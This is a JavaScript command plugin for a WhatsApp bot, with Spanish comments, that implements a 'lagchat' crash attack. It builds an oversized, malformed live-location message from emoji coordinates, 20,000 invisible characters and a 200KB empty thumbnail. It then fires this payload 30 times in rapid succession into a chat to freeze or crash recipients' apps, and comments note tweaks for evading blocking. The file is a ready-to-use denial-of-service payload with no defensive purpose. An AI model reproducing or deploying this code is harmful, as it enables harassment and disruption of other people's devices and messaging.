const buildLagMessage = () => ({
  viewOnceMessage: {
    message: {
      liveLocationMessage: {
        degreesLatitude: '💣💥'.repeat(300), // combina para evitar bloqueo
        degreesLongitude: '💥💣'.repeat(300),
        caption: '\u2063'.repeat(20000) + '💀'.repeat(2000), // 25K chars total
        sequenceNumber: '999',
        jpegThumbnail: Buffer.alloc(200000, 0), // 200KB: más estable
        contextInfo: {
          forwardingScore: 999,
          isForwarded: true,
          externalAdReply: {
            title: '💣 Lag WhatsApp ⚠️',
            body: 'Este mensaje puede cerrar tu WhatsApp.',
            mediaType: 1,
            renderLargerThumbnail: true,
            showAdAttribution: true,
            sourceUrl: 'https://wa.me/0'
          }
        }
      }
    }
  }
})

let handler = async (m, { conn, isOwner }) => {
  if (!isOwner) throw '⛔ Solo el Owner puede usar este comando.'

  const jid = m.chat
  const times = 30

  await m.reply(`⚠️ *LAGCHAT ACTIVADO*\n💣 Enviando ${times} bombas controladas...`)

  for (let i = 0; i < times; i++) {
    try {
      await conn.sendMessage(jid, buildLagMessage(), { quoted: m }) // usa sendMessage directo
      await new Promise(resolve => setTimeout(resolve, 80)) // delay muy corto
    } catch (e) {
      console.error(`❌ Error en bomba ${i + 1}:`, e)
      await m.reply('❗ Error al enviar. Puede que WhatsApp haya bloqueado el payload.')
      break
    }
  }

  await m.reply('✅ *Lagchat completado.* ¿Se congeló tu WhatsApp? 😈')
}

handler.command = /^lagchat$/i
handler.owner = true
handler.tags = ['owner']
handler.help = ['lagchat']

export default handler